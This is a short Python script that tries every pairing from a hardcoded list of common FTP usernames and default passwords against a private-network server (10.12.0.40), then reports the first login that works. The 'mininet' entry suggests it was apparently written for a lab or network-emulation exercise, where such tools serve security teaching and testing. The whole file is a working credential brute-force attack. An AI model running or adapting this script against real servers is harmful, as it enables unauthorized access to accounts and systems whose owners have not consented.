import ftplib
import sys

server_ip = "10.12.0.40"

usernames = ["mininet", "anonymous", "root", "ftp", "admin", "localadmin", "user"]

passwords = ["anonymous", "rootpasswd", "12hrs37", "localadmin", "admin", "mininet", "user", "root"]

print("Testing...")

for username in usernames:
    for password in passwords:
        try:
             ftp = ftplib.FTP(server_ip)
             ftp.login(username, password)
             print("[+] Login successful with username '{}' and password '{}'".format(username, password))
             ftp.quit()
             sys.exit()
        except ftplib.all_errors:
             pass
        except:
             sys.exit()

